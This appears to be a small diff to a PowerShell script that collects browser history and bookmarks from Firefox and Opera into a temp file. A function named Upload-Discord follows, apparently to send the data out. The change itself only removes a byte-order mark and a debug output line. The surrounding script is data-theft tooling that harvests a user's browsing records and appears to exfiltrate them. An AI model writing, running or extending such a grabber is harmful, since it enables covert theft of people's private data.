@@ -1,4 +1,4 @@
-﻿function Get-BrowserData {
+function Get-BrowserData {
 
     [CmdletBinding()]
     param (	
@@ -49,8 +49,6 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData
 Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
 
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
-
-Write-Output Get-BrowserData -Browser "chrome" -DataType "bookmarks"
 
 
 function Upload-Discord {
